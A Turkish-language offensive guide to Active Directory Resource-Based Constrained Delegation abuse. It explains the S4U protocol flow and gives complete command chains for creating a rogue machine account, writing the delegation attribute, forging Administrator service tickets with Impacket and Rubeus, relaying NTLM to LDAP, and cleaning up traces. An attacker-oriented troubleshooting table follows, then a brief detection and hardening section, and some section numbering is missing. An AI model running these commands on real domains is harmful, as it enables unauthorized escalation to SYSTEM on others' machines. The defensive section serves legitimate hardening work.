## 1. Kavramsal Temel — Neden Var?

Geleneksel Kerberos Yetki Devri (Constrained Delegation) modellerinde delegasyon yetkisi, **hizmeti sunan istemci hesabı** üzerinde yapılandırılır (`msDS-AllowedToDelegateTo`). Bu yapılandırma doğrudan **Domain Admins** seviyesinde ayrıcalık gerektirir. Microsoft, Windows Server 2012 ile birlikte yönetim yükünü hafifletmek için güven modelini tersine çevirerek **Resource-Based Constrained Delegation (RBCD)** modelini tanıttı.

RBCD modelinde güven kararı hizmeti başlatan tarafta değil, **erişilen kaynağın (hedef sunucu/bilgisayar nesnesinin) kendisinde** tutulur:
* Kaynak nesnesi üzerinde `msDS-AllowedToActOnBehalfOfOtherIdentity` adlı özel bir öznitelik bulunur.
* Bu öznitelik, bir Güvenlik Tanımlayıcısı (Security Descriptor / DACL) içerir.
* Bir saldırgan, hedef bir bilgisayar hesabı üzerinde `GenericWrite`, `GenericAll` veya ilgili öznitelik üzerinde `WriteProperty` yetkisine sahipse, **Domain Admin olmadan** bu özniteliği düzenleyebilir.
* Saldırgan, kontrol ettiği bir makine hesabını bu alana ekleyerek KDC'ye şu mesajı verir: *"Bu hedef makine, benim kontrol ettiğim makine hesabının kendi adına kullanıcıları taklit etmesine (impersonate) izin veriyor."*

> **Altın Kural:** Bir Active Directory bilgisayar nesnesi üzerinde yazma yetkisi (`GenericWrite`) elde etmek, RBCD sayesinde doğrudan o makine üzerinde **SYSTEM / Administrator** seviyesinde kod yürütme anlamına gelir.

```
Klasik Constrained:     [Yönetici (DA)] ──▶ [Ön Uç Sunucu] üzerinde AllowedToDelegateTo yapılandırır.
RBCD (Modern):          [Nesne Sahibi] ──▶ [Hedef Kaynak] üzerinde AllowedToActOnBehalfOf yapılandırır.
                                             └─► GenericWrite varsa DA OLMADAN düzenlenebilir!
```

## 2. Teknik Derinlik — Protokol Mekaniği ve S4U Uzantıları

### 2.1 Güvenlik Tanımlayıcısı: `msDS-AllowedToActOnBehalfOfOtherIdentity`

Bu öznitelik düz bir metin veya SID listesi değil, ikili formatta bir **Windows Güvenlik Tanımlayıcısıdır (Binary Security Descriptor)**. SDDL (Security Descriptor Definition Language) formatında şu yapıya karşılık gelir:

```text
O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-...-1105)
```
Burada hedef makinenin DACL'ine bir ACE (Access Control Entry) eklenir ve `S-1-5-21-...-1105` (saldırganın kontrol ettiği bilgisayar hesabı) hedef makine adına bilet taklit etme yetkisiyle donatılır.

---

### 2.2 MachineAccountQuota (MAQ) ve Rolü

RBCD saldırısının işletilebilmesi için saldırganın kontrolünde **Service Principal Name (SPN)** özniteliğine sahip bir hesap bulunmalıdır. Sıradan kullanıcı hesaplarının varsayılan olarak SPN ekleme yetkisi yoktur, ancak bilgisayar hesapları doğası gereği SPN taşır.

* Active Directory'de varsayılan etki alanı ilkesinde **`ms-DS-MachineAccountQuota = 10`** olarak gelir.
* Bu ayar, **herhangi bir düşük yetkili etki alanı kullanıcısının etki alanına 10 adede kadar yeni bilgisayar hesabı eklemesine izin verir.**
* Saldırgan, `addcomputer.py` veya `Powermad` ile kendi parolasını bildiği sahte bir makine hesabı (`ATTACKER-PC$`) oluşturur. Bu hesap otomatik olarak SPN alır ve RBCD zincirinin ilk halkasını oluşturur.

---

### 2.3 S4U2self ve S4U2proxy Protokol Trafiği

Saldırgan hedef nesneye kendi makine hesabını yazdıktan sonra, [MS-SFU] protokol uzantılarını kullanarak hedef sunucu için bilet taklit eder:

```
[Saldırgan (ATTACKER-PC$)]            [Domain Controller (KDC)]              [Hedef Sunucu (TARGET01$)]
            │                                     │                                      │
            │── 1. S4U2self (AS-REQ / TGS-REQ) ──▶│                                      │
            │   "Ben ATTACKER-PC$,                │                                      │
            │    Administrator adına TGS istiyorum"│                                     │
            │                                     │                                      │
            │◀─ 2. TGS Verilir (Administrator) ───│                                      │
            │   (Forwardable bayrağı KDC tarafından│                                     │
            │    belirlenir)                      │                                      │
            │                                     │                                      │
            │── 3. S4U2proxy (TGS-REQ) ──────────▶│                                      │
            │   "Adım 2'deki biletle TARGET01'in  │                                      │
            │    CIFS servisine erişmek istiyorum" │                                     │
            │                                     │                                      │
            │                                     │ KDC TARGET01'in AllowedToAct         │
            │                                     │ özniteliğinde ATTACKER-PC$ SID'ini   │
            │                                     │ doğrular ve ONAYLAR.                 │
            │                                     │                                      │
            │◀─ 4. Servis Bileti (ST) Verilir ────│                                      │
            │   (Administrator adına CIFS/TARGET) │                                      │
            │                                     │                                      │
            │── 5. AP-REQ (Kerberos Bileti ile Oturum Açma) ────────────────────────────▶│
            │   (TARGET01 üzerinde Administrator olarak komut yürütülür)                 │
```

## 3. Pratik Uygulama — Senaryolar ve Komutlar

### 3.1 Senaryo A: MAQ Kullanarak Sıfırdan RBCD İstismarı

#### Adım 1: Yeni Bilgisayar Hesabı Ekleyin
```bash
# Impacket addcomputer — Düşük yetkili jdoe kullanıcısı adına makine hesabı açma
impacket-addcomputer -computer-name 'EVILPC$' -computer-pass 'Winter2026!Pass' \
  -dc-ip 10.10.10.5 corp.local/jdoe:'Welcome123!'
```

#### Adım 2: Hedef Makineye Delegasyon Hakkını Yazın
```bash
# Impacket rbcd — EVILPC$'in TARGET01$ adına bilet taklit etmesine izin verme
impacket-rbcd -delegate-from 'EVILPC$' -delegate-to 'TARGET01$' -action write \
  -dc-ip 10.10.10.5 corp.local/jdoe:'Welcome123!'
```

#### Adım 3: S4U ile Administrator Adına Servis Bileti Alın
```bash
# Impacket getST — TARGET01 üzerinde CIFS (veya HOST/HTTP) bileti alma
impacket-getST -spn cifs/target01.corp.local -impersonate Administrator \
  -dc-ip 10.10.10.5 corp.local/'EVILPC$':'Winter2026!Pass'

# Bileti ortam değişkenine aktar ve SYSTEM olarak bağlan
export KRB5CCNAME=Administrator@cifs_target01.corp.local.ccache
impacket-psexec -k -no-pass corp.local/Administrator@target01.corp.local
```

---

### 3.2 Senaryo B: Windows Üzerinden PowerView ve Rubeus ile Yürütme

```powershell
# 1. Powermad ile yeni makine hesabı oluşturma
New-MachineAccount -MachineAccount EVILPC -Password (ConvertTo-SecureString 'Winter2026!Pass' -AsPlainText -Force)

# 2. PowerView ile hedef makine nesnesine RBCD DACL'ini yazma
$EvilSid = (Get-DomainComputer EVILPC).objectsid
Set-DomainRBCD -Identity TARGET01 -DelegateFrom $EvilSid

# 3. Rubeus ile S4U2self + S4U2proxy zincirini işletip belleğe bilet enjekte etme
Rubeus.exe hash /password:'Winter2026!Pass' /user:EVILPC$ /domain:corp.local
Rubeus.exe s4u /user:EVILPC$ /rc4:<hash> /impersonateuser:Administrator `
  /msdsspn:cifs/target01.corp.local /ptt

# 4. Doğrudan hedef makinenin C$ paylaşımına erişim
ls \\target01.corp.local\c$
```

---

### 3.3 Senaryo C: NTLM Relay ile Otomatik RBCD Enjeksiyonu

Hedef sunucu NTLM kimlik doğrulamasına zorlandığında (örn: WebClient veya PetitPotam üzerinden) ve SMB signing kapalı LDAP'a relay edildiğinde:

```bash
# ntlmrelayx ile LDAP'a relay ve otomatik RBCD delegasyonu
impacket-ntlmrelayx -t ldaps://dc01.corp.local \
  --delegate-access --escalate-user EVILPC$
```
Hedef makine relay edildiğinde `ntlmrelayx`, LDAP üzerinde hedef makinenin `msDS-AllowedToActOnBehalfOfOtherIdentity` alanına `EVILPC$` hesabını otomatik olarak işler.

---

### 3.4 Operasyon Sonrası İz Temizliği (Cleanup)

```bash
# Hedef makinedeki AllowedToAct özniteliğini sıfırlama (flush)
impacket-rbcd -delegate-to 'TARGET01$' -action flush \
  -dc-ip 10.10.10.5 corp.local/jdoe:'Welcome123!'

# Eklenen sahte bilgisayar hesabını etki alanından silme
impacket-addcomputer -computer-name 'EVILPC$' -delete \
  -dc-ip 10.10.10.5 corp.local/jdoe:'Welcome123!'
```

## 4. Sorun Giderme ve Hata Kodları (Troubleshooting)

| Hata Kodu / Durum | Teknik Neden | Çözüm / Yaklaşım |
|---|---|---|
| `KDC_ERR_BADOPTION` | Hedef hesap veya talep edilen bilet seçenekleri KDC tarafından desteklenmiyor. | `getST` komutunda SPN'in FQDN formatında tam girildiğini (`cifs/host.domain.local`) teyit edin. |
| `KDC_ERR_POLICY` | Taklit edilmeye çalışılan hesap **Protected Users** grubundadır veya `Account is sensitive and cannot be delegated` bayrağı açıktır. | Taklit edilecek kullanıcıyı değiştirin (örneğin etki alanı yöneticisi yerine yerel yöneticiler grubunda bulunan başka bir servis hesabı taklit edin). |
| `INSUFFICIENT_ACCESS_RIGHTS` | `EVILPC$` eklenirken MAQ sınırına takıldı (`Constraint Violation`) veya hedef nesnede yazma yetkisi yok. | `MAQ` değerini denetleyin; sıfır ise mevcut bir makine hesabı veya ele geçirilmiş gMSA kullanın. |
| `KRB_AP_ERR_SKEW` | Zaman senkronizasyonu hatası (saat farkı > 5 dakika). | Saldırı makinesinin saatini DC ile senkronize edin (`rdate -n <DC_IP>`). |

| **Event 5136** | Security (DC) | **Dizin Hizmeti Nesnesi Değiştirildi:** `msDS-AllowedToActOnBehalfOfOtherIdentity` özniteliğinde bir değişiklik meydana geldiğini gösterir. |

### 5.3 Savunma ve Sertleştirme (Hardening)

1. **`ms-DS-MachineAccountQuota` Değerini 0 Yapın:**
   Sıradan kullanıcıların kendi kendilerine makine hesabı açmasını engelleyerek RBCD'nin ilk gereksinimini ortadan kaldırın:
   ```powershell
   Set-ADDomain -Identity (Get-ADDomain).DistinguishedName -Replace @{'ms-DS-MachineAccountQuota'=0}
   ```
2. **Kritik Hesapları Koruyun:**
   Domain Admins ve diğer yetkili hesapları **Protected Users** grubuna ekleyin veya `Account is sensitive and cannot be delegated` kutucuğunu işaretleyin. Bu sayede S4U2proxy ile bu kullanıcılar asla taklit edilemez.
3. **Dizin Denetimi (Auditing):**
   `msDS-AllowedToActOnBehalfOfOtherIdentity` özniteliği için nesne bazında SACL yapılandırarak Event 5136 üretimini zorunlu kılın.
